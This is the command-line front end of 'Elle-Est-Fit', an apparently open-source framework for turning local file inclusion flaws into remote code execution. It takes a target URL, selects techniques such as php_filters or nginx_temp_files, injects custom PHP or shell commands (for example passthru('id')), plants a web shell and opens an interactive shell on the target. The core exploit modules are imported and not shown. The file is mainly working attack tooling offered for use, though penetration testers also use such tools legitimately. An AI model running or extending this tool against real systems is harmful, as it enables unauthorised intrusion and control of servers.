#!/usr/bin/env python3

import argparse
import sys
import logging
import importlib
import traceback
from typing import Callable, Optional
import textwrap

from . import __version__
from .core import LFI, info
from .exceptions import ElleEstFitError

logger = logging.getLogger("elle-est-fit")


def setup_logging(verbose: bool = False):
    """Configure logging based on verbosity level."""
    log_level = logging.DEBUG if verbose else logging.INFO
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    logging.basicConfig(level=log_level, format=log_format)


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Elle-Est-Fit: LFI to RCE Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Examples:
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique php_filters
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --double-url-encode --custom-cmd 'id'
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique nginx_temp_files --php 'passthru("id");'
        """)
    )
    
    parser.add_argument('--version', action='version', version=f'Elle-Est-Fit v{__version__}')
    
    target_group = parser.add_argument_group('Target')
    target_group.add_argument('--url', help='Target URL with LFI vulnerability (use FUZZ as the placeholder for the LFI path)')
    
    technique_group = parser.add_argument_group('Technique')
    technique_group.add_argument('--technique', help='Specific technique to use (default: auto-detect)')
    technique_group.add_argument('--list-techniques', action='store_true', help='List available techniques')
    
    encoding_group = parser.add_argument_group('Encoding')
    encoding_group.add_argument('--double-url-encode', action='store_true', help='Apply double URL encoding')
    encoding_group.add_argument('--tamper', help='Python code for custom tampering function')
    
    payload_group = parser.add_argument_group('Payload')
    payload_group.add_argument('--php', help='Custom PHP code to execute')
    payload_group.add_argument('--custom-cmd', help='Custom command to execute')
    
    output_group = parser.add_argument_group('Output')
    output_group.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    output_group.add_argument('-q', '--quiet', action='store_true', help='Suppress non-essential output')
    output_group.add_argument('--interactive', action='store_true', help='Start an interactive shell after exploitation')
    
    return parser.parse_args()


def list_available_techniques():
    """List all available techniques with their descriptions."""
    import pkgutil
    import inspect
    import importlib
    from .techniques.base import TechniqueBase
    
    print("Available techniques:")
    print("---------------------")
    
    # Find all modules in the techniques package
    techniques_path = 'elle_est_fit.techniques'
    for _, name, _ in pkgutil.iter_modules([techniques_path.replace('.', '/')]):
        if name == 'base':
            continue
            
        try:
            module = importlib.import_module(f"{techniques_path}.{name}")
            
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if (inspect.isclass(attr) and
                    issubclass(attr, TechniqueBase) and
                    attr != TechniqueBase):
                    
                    print(f"  {attr.name}: {attr.description}")
        except (ImportError, AttributeError) as e:
            print(f"  Error loading {name}: {str(e)}")
    
    print("\nUsage: --technique <technique_name>")


def parse_tamper_function(code_str: str) -> Optional[Callable[[str], str]]:
    """
    Parse and compile a tamper function from a string.
    
    Args:
        code_str: Python code string defining a tamper function
        
    Returns:
        Compiled function or None if parsing fails
    """
    if not code_str:
        return None
        
    try:
        namespace = {}
        
        if not code_str.strip().startswith('def tamper'):
            code_str = f"def tamper(payload):\n    {code_str}"
        
        exec(code_str, namespace)
        
        return namespace.get('tamper')
    except Exception as e:
        logger.error(f"Error parsing tamper function: {str(e)}")
        return None


def interactive_shell(lfi_instance):
    """
    Start an interactive shell for command execution.
    
    Args:
        lfi_instance: Initialized and exploited LFI instance
    """
    print("\nStarting interactive shell. Type 'exit' or 'quit' to exit.")
    print("------------------------------------------------------")
    
    while True:
        try:
            cmd = input("shell> ")
            
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
                
            if cmd.strip():
                output = lfi_instance.shell(cmd)
                print(output)
        except KeyboardInterrupt:
            print("\nExiting interactive shell...")
            break
        except Exception as e:
            print(f"Error: {str(e)}")


def main():
    args = parse_args()
    setup_logging(args.verbose)

    if args.list_techniques:
        list_available_techniques()
        return 0
    
    if not args.url:
        print("Error: --url is required unless --list-techniques is specified")
        return 1
    
    try:
        tamper_func = parse_tamper_function(args.tamper) if args.tamper else None
        
        url = args.url.replace('FUZZ', '{}')
        
        lfi = LFI(
            target=url,
            technique=args.technique,
            double_url_encode=args.double_url_encode,
            tamper=tamper_func,
            php_code=args.php,
            custom_cmd=args.custom_cmd,
            verbose=args.verbose
        )
        
        if lfi.exploit():
            info(f"Exploitation successful! Shell created at {lfi.shell_path}")
            
            if args.custom_cmd:
                output = lfi.shell()
                print("\nCommand output:")
                print("---------------")
                print(output)
            
            if args.interactive:
                interactive_shell(lfi)
            
            return 0
        else:
            info("Exploitation failed.")
            return 1
            
    except ElleEstFitError as e:
        logger.error(str(e))
        if args.verbose:
            traceback.print_exc()
        return 1
    except KeyboardInterrupt:
        logger.info("Operation interrupted by user.")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        if args.verbose:
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())